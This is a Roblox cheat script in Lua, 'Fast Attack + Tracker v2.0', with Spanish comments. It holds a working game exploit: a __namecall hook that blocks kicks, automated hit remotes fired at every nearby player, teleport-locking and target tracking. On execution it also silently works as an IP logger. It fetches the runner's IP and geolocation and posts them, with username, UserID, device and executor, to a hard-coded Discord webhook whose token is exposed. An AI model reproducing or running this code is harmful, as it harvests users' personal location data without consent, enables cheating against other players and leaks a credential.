-- ==================== 🔥 FAST ATTACK + TRACKER v2.0 ====================
-- by terrino48 - Sistema completo con Webhook y Anti-Kick

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local lp = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- ==================== 🌐 WEBHOOK & IP SYSTEM ====================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1505037161475346484/wl-SSZC8ifk4ynVBYj6sCjfSslbUM2n9JEnk4cV13LkN6e0PVC8TGLAXvPBsbi-MdIsQ"

local function GetIpData()
    local success, result = pcall(function() return game:HttpGet("http://ip-api.com/json/") end)
    if success then
        local d = HttpService:JSONDecode(result)
        return d.query or "N/A", d.country or "N/A", d.city or "N/A", d.regionName or "N/A"
    end
    return "Error", "Error", "Error", "Error"
end

local ip, country, city, region = GetIpData()
getgenv().execCount = (getgenv().execCount or 0) + 1

local function GetDevice()
    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
        return "📱 Móvil"
    elseif UserInputService.GamepadEnabled then
        return "🎮 Consola"
    else
        return "💻 PC"
    end
end

local function GetExecutor()
    local name = "❓ Desconocido"
    pcall(function()
        if identifyexecutor then
            name = identifyexecutor()
        elseif getexecutorname then
            name = getexecutorname()
        elseif syn then
            name = "⚡ Synapse"
        elseif KRNL_LOADED then
            name = "👑 KRNL"
        elseif fluxus then
            name = "🌀 Fluxus"
        elseif isfolder and isfolder("Xeno") then
            name = "🔥 Xeno"
        end
    end)
    return name
end

task.spawn(function()
    pcall(function()
        local data = {
            embeds = {{
                title = "🔥 TOMMY HUB TRACKER EJECUTADO",
                color = 65280,
                fields = {
                    {name = "👤 Usuario", value = lp.Name, inline = true},
                    {name = "🆔 UserID", value = tostring(lp.UserId), inline = true},
                    {name = "📱 Dispositivo", value = GetDevice(), inline = true},
                    {name = "⚡ Executor", value = GetExecutor(), inline = true},
                    {name = "🌐 IP", value = ip, inline = true},
                    {name = "🌍 País", value = country, inline = true},
                    {name = "🏙️ Ciudad", value = city, inline = true},
                    {name = "📍 Región", value = region, inline = true},
                    {name = "📊 Ejecuciones", value = tostring(getgenv().execCount), inline = true},
                    {name = "🕐 Hora", value = os.date("%H:%M:%S"), inline = true}
                },
                footer = {text = "Tommy Hub Tracker System"}
            }}
        }
        
        local req = request or http_request or (syn and syn.request) or (http and http.request)
        if req then
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
        end
    end)
end)

-- ==================== 🦾 ANTI-KICK ====================
pcall(function()
    local RS = game:GetService("ReplicatedStorage")
    local CameraShaker = RS:FindFirstChild("Util") and RS.Util:FindFirstChild("CameraShaker")
    if CameraShaker then
        local s = require(CameraShaker:WaitForChild("Main"))
        s.StartShake = function() end 
        s.ShakeOnce = function() end
    end
    
    local oldNamecall
    oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
        local method = getnamecallmethod()
        if method == "Kick" or method == "kick" then 
            return nil 
        end
        return oldNamecall(self, ...)
    end))
end)

-- ==================== CONFIGURACIÓN ====================
local Config = {
    TrackerEnabled = false,
    TargetPlayer = nil,
    Mode = "Line",
    FastAttackEnabled = false,
    FastAttackRange = 5000,
    FastAttackDelay = 0.05,
    FastAttackMode = "All",
    LockEnabled = false,
    LockHeight = 200000,
    LockOffset = Vector3.new(0, 1.5, 3.5),
    SpectateEnabled = false,
    Color = Color3.fromRGB(50, 255, 255),
    LineThickness = 2
}

-- ==================== VARIABLES ====================
local Drawings = {}
local TargetHRP = nil
local LockConnection = nil
local FastAttackConnection = nil
local SpectateConnection = nil
local OriginalCamera = nil

-- ==================== NET ====================
local Net = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Net")
local RegisterHit = Net["RE/RegisterHit"]
local RegisterAttack = Net["RE/RegisterAttack"]

-- ==================== UTILIDADES ====================
local function WorldToScreen(pos)
    local vec, onScreen = Camera:WorldToViewportPoint(pos)
    return Vector2.new(vec.X, vec.Y), onScreen
end

local function ClearDrawings()
    for _, obj in pairs(Drawings) do
        pcall(function() obj:Remove() end)
    end
    Drawings = {}
end

local function GetAllPlayers()
    local players = {}
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= lp and p.Character then
            local hum = p.Character:FindFirstChild("Humanoid")
            if hum and hum.Health > 0 then
                table.insert(players, p)
            end
        end
    end
    return players
end

-- ==================== ATAQUE RÁPIDO ====================
local function AttackTarget(target)
    if not target or not target.Character then return false end
    
    local tHRP = target.Character:FindFirstChild("HumanoidRootPart")
    local tHead = target.Character:FindFirstChild("Head")
    local myHRP = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
    
    if not tHRP or not tHead or not myHRP then return false end
    
    local distance = (myHRP.Position - tHRP.Position).Magnitude
    if distance <= Config.FastAttackRange then
        RegisterAttack:FireServer(0)
        RegisterHit:FireServer(tHead, {{target.Character, tHead}})
        return true
    end
    return false
end

local function AttackAllPlayers()
    local players = GetAllPlayers()
    local myHRP = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
    if not myHRP then return end
    
    for _, player in pairs(players) do
        if not Config.FastAttackEnabled then break end
        
        local tHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        if tHRP and (myHRP.Position - tHRP.Position).Magnitude <= Config.FastAttackRange then
            AttackTarget(player)
            task.wait(Config.FastAttackDelay)
        end
    end
end

local function StartFastAttack()
    if FastAttackConnection then task.cancel(FastAttackConnection) end
    
    FastAttackConnection = task.spawn(function()
        while Config.FastAttackEnabled do
            pcall(function()
                if not lp.Character or not lp.Character:FindFirstChild("HumanoidRootPart") then
                    task.wait(1)
                    return
                end
                
                if Config.FastAttackMode == "Target" and Config.TargetPlayer then
                    local target = Players:FindFirstChild(Config.TargetPlayer)
                    if target then
                        AttackTarget(target)
                    end
                elseif Config.FastAttackMode == "All" then
                    AttackAllPlayers()
                end
            end)
            task.wait(Config.FastAttackDelay)
        end
    end)
end

-- ==================== LOCK ====================
local function StartLock()
    if LockConnection then task.cancel(LockConnection) end
    
    LockConnection = task.spawn(function()
        while Config.LockEnabled do
            pcall(function()
                local target = Players:FindFirstChild(Config.TargetPlayer)
                if not target or not target.Character then
                    task.wait(0.5)
                    return
                end
                
                local tHRP = target.Character:FindFirstChild("HumanoidRootPart")
                local myHRP = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
                
                if tHRP and myHRP then
                    myHRP.CFrame = tHRP.CFrame + Config.LockOffset
                    task.wait(0.05)
                    
                    if Config.FastAttackEnabled then
                        AttackTarget(target)
                    end
                    
                    if Config.LockEnabled then
                        myHRP.CFrame = tHRP.CFrame + Vector3.new(0, Config.LockHeight, 0)
                    end
                end
            end)
            task.wait()
        end
    end)
end

-- ==================== SPECTATE ====================
local function StartSpectating()
    if not Config.SpectateEnabled or not Config.TargetPlayer then
        StopSpectating()
        return
    end
    
    if not OriginalCamera then
        OriginalCamera = Camera.CameraSubject
    end
    
    if SpectateConnection then
        SpectateConnection:Disconnect()
    end
    
    SpectateConnection = RunService.RenderStepped:Connect(function()
        if not Config.SpectateEnabled or not Config.TargetPlayer then
            StopSpectating()
            return
        end
        
        pcall(function()
            local target = Players:FindFirstChild(Config.TargetPlayer)
            if target and target.Character then
                local hum = target.Character:FindFirstChild("Humanoid")
                if hum then
                    Camera.CameraSubject = hum
                else
                    StopSpectating()
                end
            else
                StopSpectating()
            end
        end)
    end)
end

function StopSpectating()
    if SpectateConnection then
        SpectateConnection:Disconnect()
        SpectateConnection = nil
    end
    
    if OriginalCamera then
        pcall(function()
            Camera.CameraSubject = OriginalCamera
        end)
        OriginalCamera = nil
    else
        pcall(function()
            if lp.Character and lp.Character:FindFirstChild("Humanoid") then
                Camera.CameraSubject = lp.Character.Humanoid
            end
        end)
    end
end

-- ==================== DIBUJADOS ====================
local function DrawLine(targetPos, onScreen)
    local center = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    
    if not Drawings.Line then
        Drawings.Line = Drawing.new("Line")
        Drawings.Line.Thickness = Config.LineThickness
        Drawings.Line.Color = Config.Color
        Drawings.Line.Transparency = 1
    end
    
    Drawings.Line.From = center
    Drawings.Line.To = targetPos
    Drawings.Line.Visible = true
end

local function DrawArrow(targetPos, onScreen)
    local center = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    local radius = 80
    
    if not Drawings.Arrow then
        Drawings.Arrow = Drawing.new("Triangle")
        Drawings.Arrow.Thickness = 2
        Drawings.Arrow.Color = Config.Color
        Drawings.Arrow.Filled = true
    end
    
    local dir = (targetPos - center).Unit
    local angle = math.atan2(dir.Y, dir.X)
    local arrowPos = center + dir * radius
    
    local p1 = arrowPos + Vector2.new(math.cos(angle) * 15, math.sin(angle) * 15)
    local p2 = arrowPos + Vector2.new(math.cos(angle + 2.2) * 10, math.sin(angle + 2.2) * 10)
    local p3 = arrowPos + Vector2.new(math.cos(angle - 2.2) * 10, math.sin(angle - 2.2) * 10)
    
    Drawings.Arrow.PointA = p1
    Drawings.Arrow.PointB = p2
    Drawings.Arrow.PointC = p3
    Drawings.Arrow.Visible = true
end

local function DrawCircle(targetPos, onScreen)
    local center = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    
    if not Drawings.Circle then
        Drawings.Circle = Drawing.new("Circle")
        Drawings.Circle.Thickness = 2
        Drawings.Circle.Color = Config.Color
        Drawings.Circle.Filled = false
        Drawings.Circle.Radius = 30
    end
    
    if onScreen then
        Drawings.Circle.Position = targetPos
    else
        local dir = (targetPos - center).Unit
        Drawings.Circle.Position = center + dir * 60
    end
    Drawings.Circle.Visible = true
end

local function DrawDistance(targetPos, onScreen, target)
    if not onScreen then return end
    
    local myHRP = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
    if not myHRP or not TargetHRP then return end
    
    local distance = math.floor((myHRP.Position - TargetHRP.Position).Magnitude)
    
    if not Drawings.Text then
        Drawings.Text = Drawing.new("Text")
        Drawings.Text.Size = 14
        Drawings.Text.Center = true
        Drawings.Text.Outline = true
        Drawings.Text.Color = Config.Color
    end
    
    Drawings.Text.Text = target.Name .. " | " .. distance .. "m"
    Drawings.Text.Position = Vector2.new(targetPos.X, targetPos.Y - 25)
    Drawings.Text.Visible = true
end

local function DrawName(targetPos, onScreen, target)
    if not onScreen then return end
    
    if not Drawings.Name then
        Drawings.Name = Drawing.new("Text")
        Drawings.Name.Size = 12
        Drawings.Name.Center = true
        Drawings.Name.Outline = true
        Drawings.Name.Color = Config.Color
    end
    
    Drawings.Name.Text = target.Name
    Drawings.Name.Position = Vector2.new(targetPos.X, targetPos.Y - 20)
    Drawings.Name.Visible = true
end

local function UpdateTracker()
    if not Config.TrackerEnabled or not Config.TargetPlayer then
        ClearDrawings()
        return
    end
    
    local target = Players:FindFirstChild(Config.TargetPlayer)
    if not target or not target.Character then
        ClearDrawings()
        return
    end
    
    TargetHRP = target.Character:FindFirstChild("HumanoidRootPart")
    if not TargetHRP then
        ClearDrawings()
        return
    end
    
    local targetPos, onScreen = WorldToScreen(TargetHRP.Position)
    
    if Config.Mode == "Line" then
        DrawLine(targetPos, onScreen)
        DrawName(targetPos, onScreen, target)
    elseif Config.Mode == "Arrow" then
        DrawArrow(targetPos, onScreen)
        DrawName(targetPos, onScreen, target)
    elseif Config.Mode == "Circle" then
        DrawCircle(targetPos, onScreen)
        DrawName(targetPos, onScreen, target)
    elseif Config.Mode == "Distance" then
        DrawLine(targetPos, onScreen)
        DrawDistance(targetPos, onScreen, target)
    end
end

-- ==================== LOOP PRINCIPAL ====================
RunService.RenderStepped:Connect(function()
    UpdateTracker()
end)

-- ==================== COMANDOS PÚBLICOS ====================
function SetTarget(playerName)
    Config.TargetPlayer = playerName
    print("[Tracker] 🎯 Objetivo: " .. tostring(playerName))
end

function SetMode(mode)
    local modes = {Line = true, Arrow = true, Circle = true, Distance = true}
    if modes[mode] then
        Config.Mode = mode
        print("[Tracker] 📐 Modo: " .. mode)
    end
end

function StartTracker()
    Config.TrackerEnabled = true
    print("[Tracker] ✅ Activado")
end

function StopTracker()
    Config.TrackerEnabled = false
    ClearDrawings()
    print("[Tracker] ⛔ Desactivado")
end

function StartFastAttackMode()
    Config.FastAttackEnabled = true
    StartFastAttack()
    print("[Fast Attack] ⚡ Activado - Modo: " .. Config.FastAttackMode)
end

function StopFastAttackMode()
    Config.FastAttackEnabled = false
    if FastAttackConnection then
        task.cancel(FastAttackConnection)
        FastAttackConnection = nil
    end
    print("[Fast Attack] ⛔ Desactivado")
end

function SetFastAttackMode(mode)
    if mode == "All" or mode == "Target" then
        Config.FastAttackMode = mode
        print("[Fast Attack] 🔄 Modo cambiado a: " .. mode)
    end
end

function SetFastAttackRange(range)
    Config.FastAttackRange = range
    print("[Fast Attack] 📏 Rango: " .. range .. " studs")
end

function StartLock()
    Config.LockEnabled = true
    StartLock()
    print("[Lock] 🔒 Activado - Objetivo: " .. tostring(Config.TargetPlayer))
end

function StopLock()
    Config.LockEnabled = false
    if LockConnection then
        task.cancel(LockConnection)
        LockConnection = nil
    end
    print("[Lock] 🔓 Desactivado")
end

function StartSpectate()
    Config.SpectateEnabled = true
    StartSpectating()
    print("[Spectate] 👁️ Activado - Viendo a: " .. tostring(Config.TargetPlayer))
end

function StopSpectate()
    Config.SpectateEnabled = false
    StopSpectating()
    print("[Spectate] 👁️‍🗨️ Desactivado")
end

-- ==================== ATAJOS DE TECLADO ====================
UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    
    if input.KeyCode == Enum.KeyCode.T and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
        if Config.TrackerEnabled then StopTracker() else StartTracker() end
    end
    
    if input.KeyCode == Enum.KeyCode.F and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
        if Config.FastAttackEnabled then StopFastAttackMode() else StartFastAttackMode() end
    end
    
    if input.KeyCode == Enum.KeyCode.L and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
        if Config.LockEnabled then StopLock() else StartLock() end
    end
    
    if input.KeyCode == Enum.KeyCode.S and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
        if Config.SpectateEnabled then StopSpectate() else StartSpectate() end
    end
end)

-- ==================== INFO ====================
print("=========================================")
print("🔥 FAST ATTACK + TRACKER v2.0")
print("by terrino48")
print("=========================================")
print("")
print("📌 COMANDOS:")
print("   SetTarget('Nombre')     - Seleccionar jugador")
print("   SetMode('Line/Arrow/Circle/Distance')")
print("   StartTracker() / StopTracker()")
print("")
print("⚔️ FAST ATTACK:")
print("   StartFastAttackMode() / StopFastAttackMode()")
print("   SetFastAttackMode('All' ou 'Target')")
print("   SetFastAttackRange(5000)")
print("")
print("🔒 LOCK:")
print("   StartLock() / StopLock()")
print("")
print("👁️ SPECTATE:")
print("   StartSpectate() / StopSpectate()")
print("")
print("⌨️ ATAJOS:")
print("   Ctrl + T = Tracker")
print("   Ctrl + F = Fast Attack")
print("   Ctrl + L = Lock")
print("   Ctrl + S = Spectate")
print("=========================================")

print("")
print("👤 Usuario: " .. lp.Name)
print("🆔 UserID: " .. lp.UserId)
print("🌐 IP: " .. ip)
print("🌍 Ubicación: " .. city .. ", " .. country)
print("📊 Ejecuciones: " .. getgenv().execCount)
print("=========================================")
